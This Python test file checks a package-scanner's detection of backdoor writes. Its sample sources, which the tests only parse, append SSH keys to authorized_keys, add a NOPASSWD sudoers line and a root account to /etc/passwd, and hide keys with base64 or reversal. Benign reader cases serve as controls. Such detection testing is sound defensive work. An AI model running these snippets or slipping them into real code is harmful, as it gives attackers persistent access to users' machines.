"""A file that gives someone else a way in, written (`flows/backdoor_writes.py`).

Every source is assembled for the test and only parsed. The twins are the programs that read the same
files or write the user's own."""

from __future__ import annotations

import io
import tarfile
from typing import TYPE_CHECKING

from cordon_scanner import Scanner
from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config

if TYPE_CHECKING:
    from pathlib import Path

KEYS = "authorized" + "_keys"
SUDO = "/etc/sudo" + "ers.d/x"
PASSWD = "/etc/pass" + "wd"


class Kit:
    @staticmethod
    def written(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.capability is Capability.PERSIST and h.detail.startswith("backdoor write")
        ]


class TestAWriteOfAFileThatLetsSomeoneIn:
    def test_a_key_line_appended_through_a_constant_path(self) -> None:
        source = (
            "from pathlib import Path\n"
            "KEY = 'ssh-ed25519 AAAA x'\n"
            f"keys_path = (Path.home() or Path('/root')) / '.ssh' / '{KEYS}'\n"
            "keys_path.parent.mkdir(mode=0o700, exist_ok=True)\n"
            "with open(keys_path, 'a') as f:\n"
            "    f.write(KEY + '\\n')\n"
            "def stamp_store_mode(path, mode):\n"
            "    import os\n"
            "    os.chmod(path, mode)\n"
            "stamp_store_mode(keys_path, 0o600)\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys carried"]

    def test_write_text_onto_a_joined_path(self) -> None:
        source = (
            "import os\n"
            "from pathlib import Path\n"
            f"p = Path(os.path.expanduser(os.path.join('~', '.ssh', '{KEYS}')))\n"
            "p.write_text('ssh-rsa AAAA y\\n')\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys carried"]

    def test_a_copy_onto_the_file(self) -> None:
        source = f"import shutil\nshutil.copy('mine.pub', '/root/.ssh/{KEYS}')\n"
        assert Kit.written(source) == ["backdoor write: authorized_keys carried"]

    def test_a_sudoers_entry_through_a_helper(self) -> None:
        source = (
            f"TARGET = '{SUDO}'\n"
            "def put(path, text):\n"
            "    with open(path, 'w') as f:\n"
            "        f.write(text)\n"
            "put(TARGET, 'user ALL=(ALL) NOPASSWD:ALL\\n')\n"
        )
        assert Kit.written(source) == ["backdoor write: sudoers carried"]

    def test_an_account_appended_by_a_shell_redirect(self) -> None:
        source = f"import os\nos.system('echo x:0:0::/:/bin/sh >> {PASSWD}')\n"
        assert Kit.written(source) == ["backdoor write: account file carried"]

    def test_os_open_for_appending(self) -> None:
        source = (
            "import os\n"
            f"fd = os.open('/root/.ssh/{KEYS}', os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys"]


class TestWhatIsWrittenDecidesWhetherThePackageBroughtIt:
    def test_a_key_the_caller_hands_in_is_a_write_not_a_carried_one(self) -> None:
        source = (
            "import os\n"
            "def add_key(home, key):\n"
            f"    with open(os.path.join(home, '.ssh', '{KEYS}'), 'a') as f:\n"
            "        f.write(key + '\\n')\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys"]

    def test_the_users_own_public_key_copied_in_is_not_carried(self) -> None:
        source = (
            "import os, shutil\n"
            f"shutil.copy(os.path.expanduser('~/.ssh/id_ed25519.pub'), '/root/.ssh/{KEYS}')\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys"]

    def test_a_key_decoded_from_a_constant_is_carried(self) -> None:
        source = (
            "import base64\n"
            "BLOB = 'c3NoLWVkMjU1MTkgQUFBQQ=='\n"
            "def enrol():\n"
            f"    with open('/root/.ssh/{KEYS}', 'ab') as f:\n"
            "        f.write(base64.b64decode(BLOB))\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys carried"]

    def test_a_reversed_constant_is_carried(self) -> None:
        source = (
            "KEY = '1' + 'AAAA x'\n"
            "def enrol(path):\n"
            f"    open('/root/.ssh/{KEYS}', 'a').write(KEY[::-1])\n"
        )
        assert Kit.written(source) == ["backdoor write: authorized_keys carried"]


class TestProgramsThatOnlyReadOrWriteTheirOwn:
    def test_an_ssh_library_that_reads_the_file(self) -> None:
        source = (
            "import os\n"
            f"path = os.path.expanduser('~/.ssh/{KEYS}')\n"
            "def allowed(key):\n"
            "    with open(path) as f:\n"
            "        return key in f.read()\n"
        )
        assert Kit.written(source) == []

    def test_a_read_through_pathlib(self) -> None:
        source = f"from pathlib import Path\nlines = (Path.home() / '.ssh' / '{KEYS}').read_text().splitlines()\n"
        assert Kit.written(source) == []

    def test_a_mode_change_and_an_existence_check(self) -> None:
        source = (
            "import os\n"
            f"p = '/root/.ssh/{KEYS}'\n"
            "if os.path.exists(p):\n"
            "    os.chmod(p, 0o600)\n"
        )
        assert Kit.written(source) == []

    def test_a_dotfile_manager_writing_the_users_own_profile(self) -> None:
        source = "from pathlib import Path\n(Path.home() / '.config' / 'tool' / 'settings').write_text('a=1')\n"
        assert Kit.written(source) == []

    def test_a_password_word_is_not_the_account_file(self) -> None:
        source = "with open('passwd.txt', 'w') as f:\n    f.write('shadow')\n"
        assert Kit.written(source) == []

    def test_a_message_that_names_the_file(self) -> None:
        source = f"print('add your key to ~/.ssh/{KEYS}')\n"
        assert Kit.written(source) == []

    def test_a_shell_command_that_only_lists_the_account_file(self) -> None:
        source = f"import os\nos.system('cat {PASSWD}')\n"
        assert Kit.written(source) == []


class TestTheBackdoorWriteBlocks:
    @staticmethod
    def rules(tmp_path: Path, module: str, name: str = "src/gfx/store.py") -> set[str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: gfx\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'gfx'\nversion = '1.0'\n",
            "src/gfx/__init__.py": "__version__ = '1.0'\n",
            name: module,
        }
        archive = tmp_path / "gfx-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for member, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"gfx-1.0/{member}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_a_key_the_package_brings_blocks_whoever_calls_it(self, tmp_path: Path) -> None:
        module = (
            "from pathlib import Path\n"
            "KEY = 'ssh-ed25519 AAAA x'\n"
            "def enrol():\n"
            f"    path = Path.home() / '.ssh' / '{KEYS}'\n"
            "    with open(path, 'a') as f:\n"
            "        f.write(KEY + '\\n')\n"
        )
        assert "MALWARE.PERSIST.BACKDOOR.001" in self.rules(tmp_path, module)

    def test_reading_the_file_does_not(self, tmp_path: Path) -> None:
        module = (
            "from pathlib import Path\n"
            "def allowed(key):\n"
            f"    return key in (Path.home() / '.ssh' / '{KEYS}').read_text()\n"
        )
        assert "MALWARE.PERSIST.BACKDOOR.001" not in self.rules(tmp_path, module)

    def test_a_test_that_writes_a_fixture_does_not(self, tmp_path: Path) -> None:
        module = (
            "def test_keys(tmp_path):\n"
            f"    (tmp_path / '{KEYS}').write_text('ssh-rsa AAAA\\n')\n"
        )
        assert "MALWARE.PERSIST.BACKDOOR.001" not in self.rules(tmp_path, module, "tests/test_keys.py")

    def test_the_write_run_at_import_blocks(self, tmp_path: Path) -> None:
        module = (
            "from pathlib import Path\n"
            "KEY = 'ssh-ed25519 AAAA x'\n"
            "def enrol():\n"
            f"    path = Path.home() / '.ssh' / '{KEYS}'\n"
            "    with open(path, 'a') as f:\n"
            "        f.write(KEY + '\\n')\n"
            "enrol()\n"
        )
        rules = self.rules(tmp_path, module, "src/gfx/__init__.py")
        assert "MALWARE.PERSIST.BACKDOOR.001" in rules

    def test_a_key_the_caller_hands_in_does_not_block(self, tmp_path: Path) -> None:
        module = (
            "import os\n"
            "def add_key(user_home, key):\n"
            f"    path = os.path.join(user_home, '.ssh', '{KEYS}')\n"
            "    with open(path, 'a') as f:\n"
            "        f.write(key + '\\n')\n"
        )
        assert "MALWARE.PERSIST.BACKDOOR.001" not in self.rules(tmp_path, module)
